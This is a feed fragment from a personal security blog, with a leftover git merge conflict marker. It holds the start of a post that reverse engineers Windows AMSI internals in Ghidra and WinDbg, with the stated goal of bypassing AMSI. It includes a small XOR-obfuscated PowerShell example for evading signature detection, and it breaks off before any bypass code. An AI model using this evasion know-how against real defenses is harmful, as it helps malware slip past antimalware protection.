&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/hollowfind/&#34;&gt;hollowfind volatility plugin&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/detecting-deceptive-hollowing-techniques/&#34;&gt;DETECTING DECEPTIVE PROCESS HOLLOWING TECHNIQUES USING HOLLOWFIND VOLATILITY PLUGIN&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;the-end&#34;&gt;The end&lt;/h1&gt;
&lt;p&gt;This blog post explored the concept of section mapping and how it can be
leveraged when developing malware.&lt;/p&gt;
&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>From AMSI to Reflection 0x0</title>
      <link>https://rxOred.github.io/post/csharploader/reverse-engineering-anti-malware-scan-interface/</link>
      <pubDate>Sat, 23 Oct 2021 14:20:04 +0000</pubDate>
      
<<<<<<< HEAD
      <guid>https://rxOred.github.io/post/csharploader/reverse-engineering-anti-malware-scan-interface/</guid>
      <description>Table of Content  Introduction Antimalware Scan Interface  AMSI in action   AMSI internals  AmsiScanString AmsiScanBuffer CAmsiAntimalware::Scan AmsiInitialize   The End  Introduction In Windows environments, in both initial access and post-exploitation phases, script-based malware plays a major role. Often, hackers utilize microsoft office suite to gain initial access (using droppers, loaders) to the victim and Windows powershell to explore internal network, perform scans&amp;hellip; basically to do the post exploitation stuff.</description>
=======
      <guid>https://rxOred.github.io/post/csharploader/bypassing-amsi-with-csharp/</guid>
      <description>Table of Content Introduction Antimalware Scan Interface AMSI in action AMSI internals AmsiScanString AmsiScanBuffer CAmsiAntimalware::Scan AmsiInitialize The End Introduction In Windows environments, in both initial access and post-exploitation phases, script-based malware plays a major role. Often, hackers utilize microsoft office suite to gain initial access (using droppers, loaders) to the victim and Windows powershell to explore internal network, perform scans&amp;hellip; basically to do the post exploitation stuff. (well of course, there are powershell based droppers.</description>
      <content>&lt;h1 id=&#34;table-of-content&#34;&gt;Table of Content&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antimalware-scan-interface&#34;&gt;Antimalware Scan Interface&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#amsi-in-action&#34;&gt;AMSI in action&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#amsi-internals&#34;&gt;AMSI internals&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#amsiscanstring&#34;&gt;AmsiScanString&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#amsiscanbuffer&#34;&gt;AmsiScanBuffer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#camsiantimalware::scan&#34;&gt;CAmsiAntimalware::Scan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#amsiinitialize&#34;&gt;AmsiInitialize&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-end&#34;&gt;The End&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;In Windows environments, in both initial access and post-exploitation phases, script-based malware plays a major role. Often, hackers utilize microsoft
office suite to gain initial access (using droppers, loaders) to the victim and Windows powershell to explore internal network, perform scans&amp;hellip; basically to
do the post exploitation stuff. (well of course, there are powershell based droppers.)&lt;/p&gt;
&lt;p&gt;There is something that is common to both of these tools. Windows scripting engine.&lt;/p&gt;
&lt;p&gt;And as a result, Microsoft and antimalware vendors have developed many security mechanisms to deal with those threats that utilize script-based malware.
For example, modern anti-malware solutions can statically analyze scripts, binaries and detect whether they are malicious or not using signatures such as
strings.&lt;/p&gt;
&lt;p&gt;And because of that, malware authors use various techniques to bypass those defense mechanisms. One of the major techniques is code obfuscation.&lt;/p&gt;
&lt;p&gt;consider the following example, that I took from MSDN.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; displayEvilString
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwnd!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Assuming the above PowerShell snippet is malicious, we can write a signature to detect the malware. this signature can be &lt;code&gt;Write-Host &#39;pwnd!&#39;&lt;/code&gt; or simply
&lt;code&gt;&#39;pwnd!&#39;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So to avoid signature-based detection, the above snippet can be obfuscated like shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; obfuscatedDisplayEvilString
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $xorKey &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LHsJexJ7D3see1Z7M3sUewh7D3tbe1x7C3sMexV7H3tae1x7&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Convert&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::FromBase64String&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $newBytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; foreach&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$byte in $bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $byte -bxor $xorKey
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $newCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.Text.Encoding&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::Unicode.GetString&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$newBytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a win for malware authors since this is beyond what anti-malware solutions can emulate or detect until AMSI joins the conversation.&lt;/p&gt;
&lt;h1 id=&#34;antimalware-scan-interface&#34;&gt;Antimalware Scan Interface&lt;/h1&gt;
&lt;p&gt;Antimalware Scan Interface, AMSI for short is a standard interface that allows applications to interact with anti-malware products installed on the system. This means is that it provides
an API for Application developers. Application developers can use the API to implement security features to make sure that the end-user is safe.&lt;/p&gt;
&lt;p&gt;AMSI also enables anti malware vendors to defend againts script based malware.&lt;/p&gt;
&lt;p&gt;According to Microsoft, AMSI provides the following features by default.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-   User Account Control
-   PowerShell
-   Windows Script Host
-   JScript &amp;amp;&amp;amp; VBScript
-   Office VBA macros
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As it is clear from those default features, AMSI specifically provides anti-malware security mechanisms to defend against script-based malware.&lt;/p&gt;
&lt;h2 id=&#34;amsi-in-action&#34;&gt;AMSI in action&lt;/h2&gt;
&lt;p&gt;So let&amp;rsquo;s take Safetykatz as our example.&lt;/p&gt;
&lt;p&gt;When we run the binary, the result we get is.
&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AMSI.png&#34; alt=&#34;AMSI&#34;&gt;&lt;/p&gt;
&lt;p&gt;See, as we expected, PowerShell stops the execution of the program once it has detected the program is suspicious using AMSI.
So, how can we bypass this?, well before that, we have to dive deep into AMSI internals to understand how things work.&lt;/p&gt;
&lt;h1 id=&#34;amsi-internals&#34;&gt;AMSI internals&lt;/h1&gt;
&lt;p&gt;As I previously mentioned, AMSI enables anti malware vendors to defend againts script based
malware. This is done by using AMSI providers. An AMSI provider is basically a COM object that
implements &lt;code&gt;IAntimalwareProvider&lt;/code&gt; COM interface. An anti malware vendor who&amp;rsquo;s willing to implement AMSI interface should then register the COM object by creating a CLSID entry in &lt;code&gt;HKLM\CLSID&lt;/code&gt; and registering the
same CLSID under &lt;code&gt;HKLM\Software\Microsoft\AMSI\Providers\&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/amsiarch.jpg&#34; alt=&#34;amsi architecture&#34;&gt;&lt;/p&gt;
&lt;p&gt;As it is shown in the above diagram, AMSI provides a dll called &lt;code&gt;amsi.dll&lt;/code&gt; for application developers to
interfere with AMSI providers indirectly.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s examine PowerShell from process hacker to check whether amsi.dll is loaded.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/8.png&#34; alt=&#34;Powershell loaded modules&#34;&gt;&lt;/p&gt;
&lt;p&gt;as we can see, amsi.dll has been loaded into powershell.exe. Now, let&amp;rsquo;s take a look at this dll in-depth and see if we can find anything interesting.
Even without looking at the dll, it is possible to think of some techniques to bypass AMSI, Anyway, its time to dig deep.&lt;/p&gt;
&lt;p&gt;Before start reading disassembly, let&amp;rsquo;s examine the export table of amsi.dll.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_exports.png&#34; alt=&#34;Exports&#34;&gt;&lt;/p&gt;
&lt;p&gt;Out of the above exported functions, only two are important to us.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-   AmsiInitialize
-   AmsiScanBuffer
-   AmsiScanString
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Of course there are some other important exports. To name a few, &lt;code&gt;DllRegisterClass&lt;/code&gt;, &lt;code&gt;DllGetClassObject&lt;/code&gt; and &lt;code&gt;AmsiUacScan&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First we&amp;rsquo;ll go through AmsiScanBuffer.&lt;/p&gt;
&lt;h2 id=&#34;amsiscanstring&#34;&gt;AmsiScanString&lt;/h2&gt;
&lt;p&gt;Microsoft documentation does not tell us much about AmsiScanString function. However it
gives some basic information about it. Such as,&lt;/p&gt;
&lt;p&gt;it&amp;rsquo;s prototype,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HRESULT &lt;span style=&#34;color:#a6e22e&#34;&gt;AmsiScanString&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  [in]           HAMSICONTEXT amsiContext,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  [in]           LPCWSTR      string,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  [in]           LPCWSTR      contentName,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  [in, optional] HAMSISESSION amsiSession,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  [out]          AMSI_RESULT  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;result
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and parameter information.&lt;/p&gt;
&lt;p&gt;According to the documentation, The first parameter this function accepts is&lt;br&gt;
&lt;code&gt;amsiContext&lt;/code&gt;, which is a handle of type &lt;code&gt;HAMSICONTEXT&lt;/code&gt; that was initially received
from AmsiInitialize.&lt;/p&gt;
&lt;p&gt;Second and third parameters hold pointers to wide character strings. first one for the string that should be scanned and the latter for the &lt;code&gt;contentName&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;contentName&lt;/code&gt; can be either filename, script id, url or similar of the content being scanned.&lt;/p&gt;
&lt;p&gt;Fourth parameter is marked optional, however if multiple scan requests are to be correlated within a session, this parameter should be set to the handle returned by
&lt;code&gt;AmsiOpenSession&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;Fifth parameter is an output parameter and this is the one that indicates whether the
input string is malicous or not.&lt;/p&gt;
&lt;p&gt;As MSDN says, this function (and AmsiScanBuffer) returns &lt;code&gt;S_OK&lt;/code&gt; if the call is successful. However, the return value does not indicate whether the buffer is malicious. instead, the function uses fifth parameter of type &lt;code&gt;AMSI_RESULT&lt;/code&gt; to send the scan results to caller.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; AMSI_RESULT {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AMSI_RESULT_CLEAN,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AMSI_RESULT_NOT_DETECTED,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AMSI_RESULT_BLOCKED_BY_ADMIN_START,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AMSI_RESULT_BLOCKED_BY_ADMIN_END,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AMSI_RESULT_DETECTED
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } ;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s a take a look at &lt;code&gt;AmsiScanString&lt;/code&gt; in disassembly.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_amsiscanstring_prologue.png&#34; alt=&#34;AmsiScanString&#34;&gt;&lt;/p&gt;
&lt;p&gt;Function allocates some space in the stack and checks if the string is empty or not.
If &lt;code&gt;string&lt;/code&gt; turns out to be empty, it simply returns after loading &lt;code&gt;0x80070057&lt;/code&gt; into
&lt;code&gt;rax&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_amsiscanstring_bad_ret.png&#34; alt=&#34;bad exit&#34;&gt;&lt;/p&gt;
&lt;p&gt;if string to be scanned is not null,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_amsiscanstring_check_result.png&#34; alt=&#34;check result&#34;&gt;&lt;/p&gt;
&lt;p&gt;function checks if &lt;code&gt;result&lt;/code&gt; is null pointer. if so, well the same thing as above, it returns with bad value loaded into &lt;code&gt;rax&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;else, &lt;code&gt;result&lt;/code&gt; is valid, it loops through each wide character of the &lt;code&gt;string&lt;/code&gt; to get the length of it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_amsiscanstring_scanbuffer.png&#34; alt=&#34;call AmsiScanBuffer&#34;&gt;&lt;/p&gt;
&lt;p&gt;After getting the string length, it calls &lt;code&gt;AmsiScanBuffer&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;It is clear that this is just a simple wrapper function around &lt;code&gt;AmsiScanBuffer&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;amsiscanbuffer&#34;&gt;AmsiScanBuffer&lt;/h2&gt;
&lt;p&gt;According to the MSDN and as well as the name suggests, the &lt;code&gt;AmsiScanBuffer&lt;/code&gt; function scans a buffer for malicous content.&lt;/p&gt;
&lt;p&gt;here is the function prototype &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer&#34;&gt;msdn&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HRESULT &lt;span style=&#34;color:#a6e22e&#34;&gt;AmsiScanBuffer&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [in]           HAMSICONTEXT amsiContext,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [in]           PVOID        buffer,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [in]           ULONG        length,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [in]           LPCWSTR      contentName,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [in, optional] HAMSISESSION amsiSession,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      [out]          AMSI_RESULT  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;result
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Function takes 6 parameters. One of which is the pointer to the &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum which i explained above - &lt;code&gt;*result&lt;/code&gt;.
According to MSDN, others include a buffer, which will be scanned by the anti-malware vendor - &lt;code&gt;buffer&lt;/code&gt;, length of the buffer - &lt;code&gt;length&lt;/code&gt;, filename, URL,
unique script ID - &lt;code&gt;contentName&lt;/code&gt; and a handler to the session - &lt;code&gt;HAMSISESSION&lt;/code&gt; structure.&lt;/p&gt;
&lt;p&gt;And here&amp;rsquo;s how this function looks like in disassembly.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_prologue.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;here we can see stack pointer is stored in &lt;code&gt;r11&lt;/code&gt; register and since this is x64 _stdcall, the first four parameters are stored in rcx, rdx, r8 and r9
registers. Rest are stored in the stack. With that information, we can assume a pointer to the &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum is stored in the stack.&lt;/p&gt;
&lt;p&gt;then we can see few comparisons around global data. if the comparisons turns out to be successful, it calls &lt;code&gt;WPP_SF_qqDqq&lt;/code&gt; function. (windows sofware trace preprocessor).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_global_cmp.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;then there is a pretty huge if condition, which is essentially checks if any of the above parameters are invalid&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_check_validity.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;by looking at the comparison, the function won&amp;rsquo;t successfully return if &lt;strong&gt;[rbp]&lt;/strong&gt;, which is the first qword of &lt;code&gt;amsiContext&lt;/code&gt; is not equal to 0x49534d41.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_return_bad_val.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;And if parameters invalid, it returns &lt;code&gt;0x80070057&lt;/code&gt; (which i think is the bad return value)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_buffer_stream.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;else, as we can see in the above snippet, &lt;code&gt;buffer&lt;/code&gt; (rdx register) is now loaded with address of &lt;code&gt;CAmsiBufferStream::vftable&lt;/code&gt; and stored the value in the stack. This may sound familiar to
anyone who has done some C++ reverse engineering since this is a one way to represent constructor calls in assembly (setting vtable to
the object&amp;rsquo;s first bytes).&lt;/p&gt;
&lt;p&gt;to confirm that we can take a look at &lt;code&gt;CAmsiBufferStream::vftable&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_bufferStream_vtable.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;as we can see, &lt;code&gt;CAmsiBufferStream::vftable&lt;/code&gt; is indeed, a virtual function table and what those two instructions doing is creating an object of type &lt;code&gt;CAmsiBufferStream&lt;/code&gt;. It is also possible to see some member variable intializations too.&lt;/p&gt;
&lt;p&gt;My assumption is that &lt;code&gt;amsiContext-&amp;gt;thirdMember&lt;/code&gt; is somekind of a class that
anti-malware vendor has registered to perform scans.&lt;/p&gt;
&lt;p&gt;To make sure our assumptions so far are correct, we&amp;rsquo;ll go over this function using windbg.&lt;/p&gt;
&lt;p&gt;Since we already know interesting parts of the function, it is easy to place breakpoints.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;018&lt;/span&gt;&amp;gt; bl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; e Disable Clear  00007ffxxxxx3310     &lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt;)  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;**** amsi!AmsiScanBuffer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; e Disable Clear  00007ffxxxxx338d     &lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt;)  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; amsi!AmsiScanBuffer+0x7d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; e Disable Clear  00007ffx`xxxx3395     &lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt;)  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; amsi!AmsiScanBuffer+0x85
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; e Disable Clear  00007ffxxxx339e     &lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt;)  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;**** amsi!AmsiScanBuffer+0x8e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; e Disable Clear  00007ffxxxxx33ac     &lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0001&lt;/span&gt;)  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;** amsi!AmsiScanBuffer+0x9c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First few breakpoints are placed at locations in assembly where &lt;strong&gt;amsiContext&amp;rsquo;s&lt;/strong&gt; member variables are
being referenced. Reason being this handle is still unknown to us.
Therefore it could be useful to extract every possible information about it.
Last breakpoint is placed at the address where &lt;strong&gt;CAmsiBufferStream:vftable&lt;/strong&gt; is referenced.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So from the above image, we can assume that the first member of the
&lt;code&gt;amsiContext&lt;/code&gt; is a QWORD but it compares it with a DWORD and second and third members are also QWORDs (8 bytes).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;018&lt;/span&gt;&amp;gt; dq /c1 0x000002347f5d44d8 L1
